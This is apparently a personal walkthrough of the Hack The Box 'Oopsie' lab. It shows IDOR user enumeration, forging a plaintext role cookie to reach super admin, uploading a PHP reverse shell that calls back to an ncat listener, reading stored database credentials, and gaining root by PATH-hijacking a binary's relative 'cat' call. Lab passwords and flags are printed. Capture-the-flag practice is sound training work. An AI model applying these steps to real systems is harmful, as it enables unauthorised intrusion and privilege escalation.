# Oopsie

## Recon

Running an nmap scan showed 2 open ports - 22 and 80

```bash
sudo nmap -T4 -A -p $(sudo nmap -T4 -p- 10.10.10.28 | grep '^[0-9]\+/' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 10.10.10.28 -o scan

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
```

I visited the web page to see what I could find.
On the front page was an email `admin@megacorp.com` which could come in useful later.

Other than that not much else useful appeared, so I set dirbuster searching whilst I continued my static analysis. I did find an interesting looking script called `/cdn-cgi/login/script.js` but this turned up empty.

However coming back to dirbuster showed that some interesting pages had been found including:
- Some login screens
  - /cdn-cgi/login/index.php
  - /cdn-cgi/login/admin.php
  - /cdn-cgi/login/db.php
- Some empty directories
  - /themes
  - /uploads
  - /css
  - /fonts

## Gaining Web Access

I tried all of the login screens with the help of burp.
db.php turned up empty, and admin.php redirected to index.php

index.php was just a simple login screen with username and password fields.

I tried a few things that turned out unsuccessful:
- Various combinations of defuault server credentials using burp intruder.
- Signing in with the email on the front screen.
- Various SQL injection attempts.

Eventually I turned to the official walkthrough and found (with some annoyance) that it required us to use the password we found when cracking the [Archetype](./archetype.md) box.

This gave me a user session and access to an admin area - `cdn-cgi/login/admin.php`

## Gaining Super Admin Access

There were a couple of interesting sections in the admin sections:

### 1. The Account Tab
Clicking on `Account` bought me to a basic account info page with the following table:

```
Access ID  |  Name   |       Email
------------------------------------------
   34322   |  admin  |  admin@megacorp.com
```

The URL showed this `/cdn-cgi/login/admin.php?content=accounts&id=1`, so I ran burp intruder, replacing the id parameter from a simple number list, to see which other users existed on the system:

```
34322	admin		admin@megacorp.com
8832	john		john@tafcz.co.uk
57633	Peter		peter@qpic.co.uk
28832	Rafol		tom@rafol.co.uk
86575	super admin	superadmin@megacorp.com
```

### 2. The Uploads Tab

Visiting the uploads tab initially displays a message `This action requires super admin rights`.

On the previous page I'd found the ID, username and email address for the super admin, now I just need to see if I could fake my credentials to pose as him.
I turned on burp and reloaded the page to have a look at the headers for the page:

```
GET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1
Host: 10.10.10.28
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.10.28/cdn-cgi/login/admin.php?content=uploads
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: user=34322; role=admin
Connection: close
```

As you can see the cookie is 2 plain text key/value pairs - user and role. I changed it to the credentials for the super admin `user=86575; role=super admin` and forwarded the request. This rendered a form for uploading an image.

I added a new Regex Match and Replace rule to burp so that I would be able to browse as super admin from now on:
- Match - `^Cookie: .*$`
- Replace - `Cookie: user=86575; role=super admin`


## Getting a reverse shell

Now that I was able to upload a file to the system I rememberd about the empty `uploads` directory that dirbuster found. I tested it by uploading an image called `img.png`, and sure enough, visiting `/uploads/img.png` showed the file.

This meant that I may be able to upload a php reverse shell.

I found a reverse shell [here](https://github.com/pentestmonkey/php-reverse-shell), saved it as test.php, and uploaded it successfully.

Next I setup an ncat listener.

And finally I visited `/uploads/test.php`, which hit my ncat listener with a reverse shell, and my first flag:
```
cat /home/robert/user.txt
f2c74ee8db7983851ab2a96a44eb7981
```

## Privilage Escalation

I expanded to a (somewhat) tty shell `python3 -c 'import pty; pty.spawn("/bin/bash")'`, and then had a look around to see what I could do.
This turned out to be nothing.

After a while I remembered another result from dirbuster - `/cdn-cgi/login/db.php`

I had a look for the file and it turned out to contain some user credentials:
```
www-data@oopsie:/$ locate db.php
/var/www/html/cdn-cgi/login/db.php

www-data@oopsie:/$ cat /var/www/html/cdn-cgi/login/db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

This gave me another user to login with. I ran `su robert` to get a shell as robert, and then realized that I could SSH in with a full tty shell, so I exited, and ran `ssh robert@10.10.10.28`


`sudo -l` showed that robert had no sudo permissions, so I had to do some research as to other ways to escalate my privilage.


First I tried out the `id` command:

```
robert@oopsie:/$ id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

This showed that robert is in the bugtracker group, so I had a look for any files that bugtracker members might be able to run:
```
robert@oopsie:/$ find / -type f -group bugtracker 2>/dev/null
/usr/bin/bugtracker
```

Running the `bugtracker` binary showed a simple program that allowed me to view bugs with the system, one in particular caught my eye:
```
robert@oopsie:/usr/bin$ bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 2
2
---------------

If you connect to a site filezilla will remember the host, the username and the password (optional). The same is true for the site manager. But if a port other than 21 is used the port is saved in .config/filezilla - but the information from this file isn't downloaded again afterwards.

ProblemType: Bug
DistroRelease: Ubuntu 16.10
Package: filezilla 3.15.0.2-1ubuntu1
Uname: Linux 4.5.0-040500rc7-generic x86_64
ApportVersion: 2.20.1-0ubuntu3
Architecture: amd64
CurrentDesktop: Unity
Date: Sat May 7 16:58:57 2016
EcryptfsInUse: Yes
SourcePackage: filezilla
UpgradeStatus: No upgrade log present (probably fresh install)
```

This seemed very hopeful, but unfortunately `find / -type d -name .config/filezilla 2>/dev/null` came up empty, which must mean the file is only accessable as route.

A **very** long time later, after a lot of research, I found a solution for a root shell.

Using the `string` command I was able to find the system calls used in the bugtracker binary:
```
robert@oopsie:/usr/bin$ strings /usr/bin/bugtracker
------------------
: EV Bug Tracker :
------------------
Provide Bug ID:
---------------
cat /root/reports/
```

The call to `cat` is a relative path, meaning it can be redefined by changing the path, so I ran the following commands to redefine `cat`:
```bash
export PATH=/home/robert:$PATH
echo '/bin/sh' > cat
chmod +x cat
```

Next time I ran bugtracker I was given a root shell and the final flag:
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/usr/sbin # Removes cat definition
cat /root/root.txt
af13b0bee69f8a877c3faf667f7beacf
```

## Post Root

Even though I had the root shell I was interested about the potential filezilla dump provided in the bugtracker.

```
find / -type d -name filezilla 2>/dev/null
/root/.config/filezilla
```

Now that I was able to view the dump I checked the directory and found a file with some credentials:
```
# ls -al /root/.config/filezilla
drwxr-xr-x 2 root root 4096 Sep 11  2020 .
drwxr-xr-x 3 root root 4096 Jan 25  2020 ..
-rw-r--r-- 1 root root  646 Sep 11  2020 filezilla.xml

# cat /root/.config/filezilla/filezilla.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<FileZilla3>
    <RecentServers>
        <Server>
            <Host>10.10.10.46</Host>
            <Port>21</Port>
            <Protocol>0</Protocol>
            <Type>0</Type>
            <User>ftpuser</User>
            <Pass>mc@F1l3ZilL4</Pass>
            <Logontype>1</Logontype>
            <TimezoneOffset>0</TimezoneOffset>
            <PasvMode>MODE_DEFAULT</PasvMode>
            <MaximumMultipleConnections>0</MaximumMultipleConnections>
            <EncodingType>Auto</EncodingType>
            <BypassProxy>0</BypassProxy>
        </Server>
    </RecentServers>
</FileZilla3>
```

This appears to be some kind of FTP server on the local network, and some credentials with which to logon:
- Host: 10.10.10.46
- User: ftpuser
- Pass: mc@F1l3ZilL4


I connected to the FTP server using the credentials:
```
kali@kali:~/workspace/hackthebox/archetype$ ftp 10.10.10.46
Connected to 10.10.10.46.
220 (vsFTPd 3.0.3)
Name (10.10.10.46:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

An `ls` showed a single backup file, which I downloaded:
```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2533 Feb 03  2020 backup.zip
226 Directory send OK.
ftp> get backup.zip
local: backup.zip remote: backup.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
226 Transfer complete.
2533 bytes received in 0.02 secs (108.5355 kB/s)
```

The zipfile turned out to be password protected, and none of the provided passwords opened it. For now I can't be bothered to crack this so I'll leave it for another day.